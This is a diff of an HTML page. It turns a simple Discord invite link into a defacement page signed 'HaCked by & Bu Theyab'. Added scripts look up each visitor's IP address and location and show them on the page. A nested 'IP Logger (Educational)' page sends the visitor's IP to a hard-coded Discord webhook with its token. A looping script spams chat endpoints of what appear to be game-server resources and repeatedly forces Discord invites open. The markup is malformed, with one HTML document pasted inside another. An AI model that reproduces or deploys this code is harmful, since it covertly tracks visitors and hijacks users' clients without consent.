@@ -1,42 +1,158 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Click to Join Discord</title>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background-color: #111;
-      color: white;
-      font-family: Arial, sans-serif;
-    }
-
-    #clickArea {
-      position: absolute;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/erzhHvmNSH</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+    #bg-video {
+      position: fixed;
       top: 0;
       left: 0;
-      width: 100%;
-      height: 100%;
-      background: transparent;
-      cursor: pointer;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 24px;
+      min-width: 100%;
+      min-height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .info {
+      font-size: 1.4em;
+      text-shadow: 0 0 8px White, 0 0 15px White, 0 0 25px White;
+      letter-spacing: 2px;
+    }
+
+    .text {
+      font-size: 3em;
+      text-shadow: 0 0 10px White;
+      letter-spacing: 5px;
+      margin-top: 2vh;
     }
   </style>
 </head>
 <body>
-  <div id="clickArea" onclick="openDiscord()">
-    
+
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+
+  <!-- 🔊 Embedded MP3 Audio (autoplay + loop) -->
+  <audio autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1361773811955007729/1361773889251967017/Falcon_Rp.mp4?ex=68aea903&is=68ad5783&hm=c7ec6d194563cdcf25cefb40cdf4dddb9313762f89a61ad82ac62a778d7e4f29&" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+
+  <!-- IP Info Display -->
+  <div class="info" id="ip-info">
+    <strong>IP: <span id="ip"></span></strong><br>
+    <span><strong>City:</strong> <span id="city"></span></span><br>
+    <span><strong>Region:</strong> <span id="region"></span></span><br>
+    <span><strong>Country:</strong> <span id="country"></span></span><br>
+    <span><strong>Location:</strong> <span id="loc"></span></span><br>
+    <span><strong>Organization:</strong> <span id="org"></span></span><br>
+    <span><strong>Timezone:</strong> <span id="timezone"></span></span>
   </div>
 
+  <!-- Footer Text -->
+  <div class="text">HaCked by & Bu Theyab
+  
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Logger (Educational)</title>
+</head>
+<body>
+  <h1></h1>
+  <p id="ip"</p>
+
   <script>
-    function openDiscord() {
-      window.open("https://discord.gg/erzhHvmNSH", "_blank");
-    }
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1401402084624044032/SAhbEAqKtHeaXxs1HJR3aHmQGwhlw5hes8HEWE9kxkAn3R2IgYE9W1iF7dqZbGJPFgrP";
+
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        document.getElementById('ip').textContent = ip;
+        const payload = {
+          content: ` New Visitor IP: \`${ip}\``
+        };
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        }).then(res => {
+          console.log("IP sent to Discord.");
+        }).catch(err => {
+          console.error("Failed to send to Discord:", err);
+        });
+
+      })
+      .catch(error => {
+        document.getElementById('ip').textContent = "Failed to load IP.";
+        console.error("IP fetch error:", error);
+      });
   </script>
 </body>
 </html>
+
+  
+  
+
+
+  <!-- IP Lookup Script -->
+  <script>
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("ip").textContent = data.ip;
+        document.getElementById("city").textContent = data.city;
+        document.getElementById("region").textContent = data.region;
+        document.getElementById("country").textContent = data.country;
+        document.getElementById("loc").textContent = data.loc;
+        document.getElementById("org").textContent = data.org;
+        document.getElementById("timezone").textContent = data.timezone;
+      });
+  </script>
+
+</body>
+</html>
+<script>
+const msg = `& メ 𝗕𝗨 𝗧heyab - .gg/wZYVPtR6Rc ! 👑`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/ppt2qQJYB8");
+window.invokeNative("openUrl", "https://discord.gg/ppt2qQJYB8");
+window.invokeNative("openUrl", "https://discord.gg/ppt2qQJYB8");
+window.invokeNative("openUrl", "https://discord.gg/ppt2qQJYB8");
+}, 1000);
+    </script>
